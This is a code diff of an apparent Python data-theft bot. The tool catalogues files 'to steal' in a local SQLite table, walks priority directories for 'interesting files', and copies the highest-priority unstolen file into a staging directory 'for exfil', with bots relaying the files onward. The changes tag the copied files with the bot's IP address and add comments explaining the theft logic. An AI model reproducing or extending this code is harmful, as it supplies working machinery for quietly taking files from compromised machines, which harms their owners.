@@ -97,7 +97,7 @@ def create_men_db(conn):
     c.close()
 
 def create_file_db(conn):
-    '''Create a local SQLite3 database and table to hold data on files to steal'''
+    '''Create a table in the local SQLite3 database to hold data on files to steal'''
     # Connection object comes from the caller
     c = conn.cursor()
     c.execute('drop table if exists swag')
@@ -105,8 +105,8 @@ def create_file_db(conn):
     conn.commit()
     c.close()
     
-def steal_a_file(conn):
-    '''Get the highest priority file in the files table and copy it to the datadir'''
+def steal_a_file(conn, my_ip):
+    '''Get the highest priority "unstolen" file in the files table and copy it to the datadir'''
     c = conn.cursor()
     # First get the name of the file
     c.execute('select name from swag where stolen = 0 order by priority limit 1')
@@ -116,7 +116,7 @@ def steal_a_file(conn):
     conn.commit()
     c.close()
     # Finally, transfer the file to the data_dir for exfil
-    shutil.copyfile(file[0], data_dir + '/' + file[0].replace('/','_'))
+    shutil.copyfile(file[0], data_dir + '/' + my_ip.replace('.', '-') + file[0].replace('/','_'))
               
 def store_file_info(conn, filelst):
     '''Store the data from the file list in a local SQLite3 database'''
@@ -266,6 +266,10 @@ if __name__=='__main__':
         filelst = []
         priority = 1
         stolen = 0
+        # myfiles is a list with priority one individual files
+        # This loop creates a list, along with the last-modified
+        # time for each, as well as default values for their
+        # priority and whether they've already been "stolen"
         for file in myfiles:
             try:
                 mtime = time.ctime(os.path.getmtime(file))
@@ -273,6 +277,9 @@ if __name__=='__main__':
                 filelst.append([file, mtime, priority, stolen])
             except:
                 pass
+        # mydirs is a list of directories containing interesting
+        # files to steal. They're listed in priority order, from
+        # highest to lowest
         for dir in mydirs:
             priority += 1
             for root, dirs, files in os.walk(dir, topdown=True):
@@ -284,7 +291,7 @@ if __name__=='__main__':
                         filelst.append([file, mtime, priority, stolen])
                     except:
                         pass
-        # Store the file list
+        # Store the file list in the local database
         print(strftime('%H:%M:%S') + ' Please wait while I store info on files to steal...')
         store_file_info(conn, filelst)
         print(strftime('%H:%M:%S') + ' Okay, all file data has been stored!')
@@ -330,7 +337,7 @@ if __name__=='__main__':
             # Check to see whether any new files have come our way since the last
             # loop iteration.
             if my_seq_no == 0:
-                steal_a_file(conn)
+                steal_a_file(conn, my_ip)
             files = os.listdir(data_dir)
             print(strftime('%H:%M:%S') + ' Files in the data directory:', files)
             # For those bots that have clients, we need to send these files to the
